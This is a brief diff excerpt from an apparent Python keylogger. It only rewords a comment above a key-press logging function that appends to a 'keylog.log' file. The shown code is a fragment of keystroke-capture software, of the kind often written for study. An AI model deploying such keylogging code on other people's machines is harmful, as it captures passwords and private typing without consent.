@@ -11,7 +11,7 @@ def main():
     # specifies the name/location of the file where the output will be saved
     log_file = f'{os.getcwd()}/{"keylog"}.log' 
 
-    # the logging function with 
+    # the logging function that is based on key presses 
     def KeyP(e):
         # open the file with append 
         with open(log_file, "a") as f: 
